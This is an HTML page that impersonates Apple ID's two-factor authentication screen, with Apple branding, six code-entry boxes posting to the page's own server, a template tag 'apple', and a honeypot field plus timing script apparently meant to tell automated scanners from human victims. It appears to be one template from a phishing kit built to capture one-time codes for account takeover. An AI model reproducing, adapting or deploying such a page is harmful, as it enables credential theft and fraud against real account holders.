<meta property="og:title" content="Verify it is you - Apple ID">
<meta property="og:site_name" content="Apple ID">
<style>
  body { margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; }
  .card { background:#fff;width:100%;max-width:420px;border-radius:12px;padding:40px 36px;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,.10); }
  .mark { display:flex;justify-content:center;margin:0 0 20px; }
  h1 { font-size:20px;margin:0 0 8px;color:#1d1d1f;font-weight:600; }
  p { color:#6e6e73;font-size:14px;line-height:1.55;margin:0 0 22px; }
  .otp { display:flex;gap:8px;justify-content:center;margin-bottom:20px; }
  .otp input { width:44px;height:52px;text-align:center;font-size:20px;border:1px solid #ccd0d5;border-radius:8px;outline:none;background:#fff;color:#1d1d1f; }
  .otp input:focus { border-color:#000000; }
  button { width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;background:#000000;border:0;border-radius:12px;cursor:pointer; }
  .resend { margin-top:14px;font-size:13px;color:#6e6e73; }
  .resend a { color:#000000;text-decoration:none; }
</style>
</head>
<body>
<form class="card" method="POST" action="/">
  <div class="mark"><svg viewBox="0 0 170 170" width="36" height="36" role="img" aria-label="Apple"><path fill="#000" d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.93.21-9.84-1.96-14.75-6.52-3.13-2.73-7.04-7.42-11.73-14.06-5.04-7.1-9.18-15.33-12.43-24.72-3.49-10.14-5.24-19.96-5.24-29.47 0-10.89 2.35-20.29 7.06-28.17 3.7-6.33 8.63-11.32 14.8-14.99 6.17-3.66 12.84-5.53 20.03-5.65 3.91 0 9.05 1.21 15.44 3.59 6.37 2.39 10.46 3.6 12.26 3.6 1.34 0 5.89-1.42 13.61-4.25 7.3-2.62 13.46-3.71 18.5-3.28 13.67 1.1 23.94 6.49 30.78 16.19-12.23 7.41-18.28 17.79-18.16 31.1.11 10.37 3.87 19 11.27 25.86 3.35 3.18 7.09 5.64 11.25 7.39-.9 2.62-1.85 5.13-2.86 7.54zM119.11 7.24c0 8.13-2.97 15.72-8.9 22.75-7.15 8.36-15.8 13.19-25.18 12.44a25.3 25.3 0 0 1-.19-3.08c0-7.8 3.4-16.15 9.43-22.98 3.01-3.46 6.84-6.34 11.49-8.63 4.64-2.25 9.03-3.5 13.16-3.72.12 1.08.19 2.16.19 3.22z"/></svg></div>
  <h1>Two-Factor Authentication</h1>
  <p>Enter the verification code sent to your trusted devices.</p>
  <div class="otp">
    <input name="otp_1" maxlength="1" inputmode="numeric" autofocus>
    <input name="otp_2" maxlength="1" inputmode="numeric">
    <input name="otp_3" maxlength="1" inputmode="numeric">
    <input name="otp_4" maxlength="1" inputmode="numeric">
    <input name="otp_5" maxlength="1" inputmode="numeric">
    <input name="otp_6" maxlength="1" inputmode="numeric">
  </div>
  <button type="submit">Continue</button>

  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
  <input type="hidden" name="_tpl" value="apple">
  <input type="hidden" name="_ts" value="__TS__">
  <div class="resend">Didn't get a code? <a href="#">Resend</a></div>

<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  });
})();
</script>
</form>
</body>
</html>
